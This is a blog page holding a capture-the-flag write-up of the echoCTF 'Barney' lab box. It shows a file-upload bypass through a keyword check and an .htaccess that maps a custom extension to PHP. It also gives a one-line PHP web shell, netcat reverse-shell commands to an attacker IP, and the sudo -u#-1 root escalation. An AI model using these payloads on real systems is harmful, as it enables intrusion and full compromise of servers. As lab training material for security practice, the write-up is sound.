<!doctype html><html lang=en><head><title>echoCTF Barney Writeup: File Upload to root via sudo foo :: Hacking Blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Crack Barney on echoCTF with file upload enumeration, bypasses and sudo foo. Perfect for OSCP prep!"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/writeups/echoctf/barney/barney/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.775ac2af004d44c22a6d000fbd1d9af529642f5cef27399d0280d180af2c2e9b.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css><link rel=stylesheet href=https://hack.com.cy/css/sidebar.min.d99f1331c4dc2becb305a3d135a35844adbf5c1f39330853456f7e7f5864cb45.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel=stylesheet href=https://hack.com.cy/style.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="echoCTF Barney Writeup: File Upload to root via sudo foo"><meta property="og:description" content="Crack Barney on echoCTF with file upload enumeration, bypasses and sudo foo. Perfect for OSCP prep!"><meta property="og:url" content="https://hack.com.cy/writeups/echoctf/barney/barney/"><meta property="og:site_name" content="Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="CTF"><meta property="article:section" content="OSCP Prep"><meta property="article:section" content="echoCTF"><meta property="article:published_time" content="2025-08-15 00:00:00 +0000 UTC"><meta name=theme-color content="#0a0e14"><meta name=color-scheme content="dark"><link rel=preload href=/fonts/FiraCode-Latin.woff2 as=font type=font/woff2 crossorigin><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><script defer src=https://hack.com.cy/js/search.js></script></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/why/><div class=logo>Hacking Vault</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li><li><button class=search-button onclick=showSearch() aria-label=Search>Search</button></li></ul></nav></header><div class=content><nav class=breadcrumbs aria-label=Breadcrumb><ol class=breadcrumb-list><li class=breadcrumb-item><a href=https://hack.com.cy/ class=breadcrumb-link><span class=breadcrumb-icon>~</span>Home</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/barney/ class=breadcrumb-link></a></li><li class=breadcrumb-separator>/</li><li class="breadcrumb-item breadcrumb-current" aria-current=page><span class=breadcrumb-text>echoCTF Barney Writeup: File Upload to root via sudo foo</span></li></ol></nav><style>.breadcrumbs{margin:20px 0 30px;padding:10px 15px;background:var(--background-secondary);border-left:3px solid var(--accent);border-right:1px solid var(--code-border);border-top:1px solid var(--code-border);border-bottom:1px solid var(--code-border)}.breadcrumb-list{display:flex;flex-wrap:wrap;align-items:center;list-style:none;margin:0;padding:0;gap:8px;font-size:.9rem}.breadcrumb-item{display:inline-flex;align-items:center}.breadcrumb-link{color:var(--accent-secondary);text-decoration:none;transition:all .2s ease;display:inline-flex;align-items:center;gap:5px}.breadcrumb-link:hover{color:var(--accent);text-shadow:0 0 5px var(--glow-accent)}.breadcrumb-icon{color:var(--accent);font-weight:700}.breadcrumb-separator{color:var(--code-border);user-select:none}.breadcrumb-current .breadcrumb-text{color:var(--foreground);font-weight:700}@media(max-width:684px){.breadcrumbs{font-size:.85rem;overflow-x:auto}.breadcrumb-list{flex-wrap:nowrap}}</style><article class=post><h1 class=post-title><a href=https://hack.com.cy/writeups/echoctf/barney/barney/>echoCTF Barney Writeup: File Upload to root via sudo foo</a></h1><div class=post-meta><time class=post-date>2025-08-15&nbsp;[Updated 2026-01-01]</time><span class=post-reading-time>5 min read (912 words)</span></div><span class=post-tags>#<a href=https://hack.com.cy/tags/apache/>Apache</a>&nbsp;
#<a href=https://hack.com.cy/tags/.htaccess/>.htaccess</a>&nbsp;
#<a href=https://hack.com.cy/tags/sudo/>sudo</a>&nbsp;
#<a href=https://hack.com.cy/tags/privilege-escalation/>privilege escalation</a>&nbsp;</span><div class=table-of-contents><h2>Contents</h2><nav id=TableOfContents><ul><li><a href=#nmap>NMAP</a></li><li><a href=#nmap-output>NMAP Output</a></li></ul></nav></div><div class=post-content><div><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>#</a></h1><p>Start by port scanning the target machine.
And reading the description of the box that highlight the keyword <code>beer</code> and the following:
<code>Provide a steady supply of beer and you may get something more than a BURRRRRRPPPP!</code></p><h2 id=nmap>NMAP<a href=#nmap class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV
</span></span></code></pre></div><h2 id=nmap-output>NMAP Output<a href=#nmap-output class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT   STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>80/tcp open  http    syn-ack ttl <span class=m>63</span> Apache httpd 2.4.38 <span class=o>((</span>Debian<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST
</span></span></code></pre></div><p>Found an Apache webserver version 2.4.38 running on port 80.</p><p>Since is Apache we know its using PHP by default, also by visiting the page we see that there is an upload functionality with a &ldquo;message&rdquo; saying that it does not accept PHP files.</p><p><img src=/images/barney-1.png alt="Image Description"></p><p>Start a directory brute force to search for hidden files</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://10.0.50.0/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt - root-rsw.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Nothing Interesting Found</span>
</span></span></code></pre></div><p>Lets try to upload a <code>.txt</code> file to the application.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat test.txt
</span></span><span class=line><span class=cl>dotpirate
</span></span></code></pre></div><p><img src=/images/barney-3.png alt="Image Description"></p><p><img src=/images/barney-2.png alt="Image Description"></p><h1 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>#</a></h1><p>Trying to upload different file formats such as <code>.png</code> <code>.jpg</code> <code>.svg</code> gives us the same response.
Then tried more file formats using brute force and a wordlist which again gave us back the same response. We can automate this with <code>ffuf</code> likewise.</p><p>First save the POST request from burp to a file locally
Then edit the file and add the word <code>FUZZ</code> in the place you want to brute force.</p><p><img src=/images/barney-8.png alt="Image Description"></p><p>Now we can utilize <code>ffuf</code> to do the brute force</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -X POST -request upload.txt -request-proto <span class=s2>&#34;http&#34;</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt
</span></span></code></pre></div><p>We can also view the request sent by <code>ffuf</code> through burp to make sure the attack is done as expected.</p><p>To do this we have to add the <code>-x</code> flag which allows us to specify a proxy</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -X POST -request upload.txt -request-proto <span class=s2>&#34;http&#34;</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt -x http://127.0.0.1:8080
</span></span></code></pre></div><p><img src=/images/barney-9.png alt="Image Description"></p><p>However as you can see all of the tries came back with the same error.</p><blockquote><p>More attacks/techniques on how to <code>attack file upload functionality</code> along with my personal methodology can be found <a href=/notes/web/file-uploads/file-uploads/>here</a></p></blockquote><p>After multiple attempts and different techniques I went back and read the description.
Then I begun to replace values of the upload requests with the word <code>beer</code>.</p><p><img src=/images/barney-4.png alt="Image Description"></p><p>And it worked!</p><p><img src=/images/barney-5.png alt="Image Description"></p><p>So now, I started removing the word <code>beer</code> one by one and resend the request in order to understand which value is the one that allows us to bypass that restriction.</p><p>It seems that the property <code>name</code> within the upload POST request is the one that requires the word beer to proceed with the upload</p><p><img src=/images/barney-6.png alt="Image Description"></p><p>So now that we can finally upload files lets try to upload a malicious PHP web shell!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat shell.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php system<span class=o>(</span><span class=nv>$_REQUEST</span><span class=o>[</span><span class=s1>&#39;dotpirate&#39;</span><span class=o>])</span><span class=p>;</span> ?&gt;
</span></span></code></pre></div><p>But he hit another wall with a different error now..
<img src=/images/barney-10.png alt="Image Description"></p><p>Back to fuzzing!</p><p>First i tried fuzzing the filename extension using <code>ffuf</code> and see if i can get any PHP equivalent files to pass such as <code>php3, php4</code> etc. This wordlist can be found <a href=https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst>here</a></p><p>Modified my POST request.</p><p><img src=/images/barney-11.png alt="Image Description"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -X POST -request upload.txt -request-proto <span class=s2>&#34;http&#34;</span> -w ./php-extensions.txt -x http://127.0.0.1:8080
</span></span></code></pre></div><p>It seems that we managed to upload multiple files on the server</p><p><img src=/images/barney-12.png alt="Image Description"></p><p>However when we try to access and execute our web shell it does not work so now we can guess that there must be a security control behind this website which allows specific PHP versions to be executed.</p><p>Something that i have missed however is that whenever we upload a file successfully the file is saved in the root directory of the webserver &ldquo;/&rdquo;. This means that we can attempt to upload a <code>.htaccess</code> and hopefully replace the one that is on the server allowing our own file extensions to be uploaded!</p><p>If you do not know what <code>.htaccess</code> is, it is worth give it a 5 min look!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat .htaccess
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>AddType application/x-httpd-php .dotpirate
</span></span></code></pre></div><p><img src=/images/barney-14.png alt="Image Description"></p><p>It seems that the file uploaded successfully without any error, lets try uploading our web shell again but using out custom extension <code>shell.dotpirate</code>. Also make sure to change the content type as the one we specified in out <code>.htaccess</code> -> <code>application/x-httpd-php</code></p><p>This is how our upload POST request should look like now:</p><p><img src=/images/barney-13.png alt="Image Description"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl <span class=s1>&#39;http://10.0.50.0/shell.dotpirate?dotpirate=id&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span></code></pre></div><p>We finally get our web shell!</p><p>Let get a reverse shell, by first checking if <code>nc</code> is enabled on the target server. Then we can open a <code>netcat</code> listener and then use <code>nc</code> to send us a reverse shell!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nc -nvlp <span class=m>80</span>                          
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> kali: 
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>80</span> ...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl <span class=s1>&#39;http://10.0.50.0/shell.dotpirate?dotpirate=which%20nc&#39;</span>
</span></span><span class=line><span class=cl>/bin/nc 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl <span class=s1>&#39;http://10.0.50.0/shell.dotpirate?dotpirate=nc%2010.10.11.150%2080%20-e%20/bin/bash&#39;</span>
</span></span></code></pre></div><p><img src=/images/barney-15.png alt="Image Description"></p><h1 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>#</a></h1><p>Lets upgrade our shell using python</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>CTRL + Z
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>stty raw -echo<span class=p>;</span><span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>Manual enumeration i always do before going for automated scripts</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Check who we are?</span>
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># What other users exist on the box?</span>
</span></span><span class=line><span class=cl>cat /etc/passwd <span class=p>|</span> grep sh$
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Do i have sudo capabilities?</span>
</span></span><span class=line><span class=cl>sudo -l
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Are there ant localservices running on the box?</span>
</span></span><span class=line><span class=cl>netstat -ano <span class=p>|</span> grep LIST
</span></span><span class=line><span class=cl>ss -antp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Always check the directroy we landed it, in this case is `/var/www/html/images`</span>
</span></span><span class=line><span class=cl>ls -la
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Check for wierd files in `/opt` and `/tmp`</span>
</span></span><span class=line><span class=cl>ls -la /tmp <span class=o>&amp;&amp;</span> ls -la /opt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@barney:/var/www/html$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@barney:/var/www/html$ cat /etc/passwd <span class=p>|</span> grep sh$
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>ETSCTF:x:1000:33:ETSCTF_6c32ae1cc8901e60d12247bb0e2a2830:/home/ETSCTF:/bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@barney:/var/www/html$ sudo -l
</span></span><span class=line><span class=cl>User www-data may run the following commands on barney:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL, !root<span class=o>)</span> NOPASSWD: ALL
</span></span></code></pre></div><p>By simple google the output of <code>sudo -l</code> point me to a reddit <a href=https://www.reddit.com/r/linux/comments/dhwchx/sudo_flaw_lets_linux_users_run_commands_as_root/>discussion</a> which suggest a bypass!
<img src=/images/barney-16.png alt="Image Description"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo -u#-1 id -u
</span></span></code></pre></div><p>By trying it we can get reverse shell as root!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nc -nvlp <span class=m>80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo -u#-1 nc 10.10.11.150 <span class=m>80</span> -e /bin/bash
</span></span></code></pre></div><p><img src=/images/barney-17.png alt="Image Description"></p><p>ROOT!</p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script><div id=search-overlay><div class=search-container><input type=search id=search-input placeholder="Search writeups, notes, and more..." autocomplete=off aria-label=Search><div class=search-hint>Press <kbd>ESC</kbd> to close or <kbd>/</kbd> to open search</div><div id=search-results></div></div><button class=search-close onclick=hideSearch() aria-label="Close search">×</button></div></div></body></html>